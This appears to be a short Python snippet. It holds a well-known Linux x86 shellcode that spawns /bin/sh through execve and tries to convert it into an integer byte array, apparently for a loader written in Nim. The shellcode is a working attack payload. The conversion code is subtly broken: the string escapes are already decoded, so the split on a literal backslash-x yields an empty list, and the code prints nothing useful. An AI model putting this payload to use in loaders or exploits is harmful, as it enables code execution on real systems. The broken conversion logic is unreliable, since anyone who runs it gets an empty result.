# Define the shellcode as a string
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Split the shellcode into individual bytes
bytes = shellcode.split("\\x")[1:]

# Convert each byte to its corresponding integer value
nim_bytes = [int(b, 16) for b in bytes]

# Print the resulting byte array
print(nim_bytes)
